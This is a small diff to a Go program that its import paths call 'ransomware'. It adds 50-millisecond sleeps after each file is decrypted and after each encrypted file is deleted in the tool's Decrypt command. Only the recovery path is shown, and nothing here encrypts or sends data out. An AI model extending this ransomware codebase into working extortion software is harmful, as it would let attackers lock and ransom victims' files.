@@ -13,6 +13,7 @@ import (
 	"path/filepath"
 	"strings"
 	"text/template"
+	"time"
 
 	"github.com/marmos91/ransomware/crypto"
 	"github.com/marmos91/ransomware/fs"
@@ -242,6 +243,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 
 	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
 		err := decryptFile(path, rsaPrivateKey, encSuffix)
+		time.Sleep(50 * time.Millisecond)
 
 		if err != nil {
 			return err
@@ -249,6 +251,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 
 		if !dryRun {
 			err := fs.DeleteFileIfExists(path)
+			time.Sleep(50 * time.Millisecond)
 
 			if err != nil {
 				return err
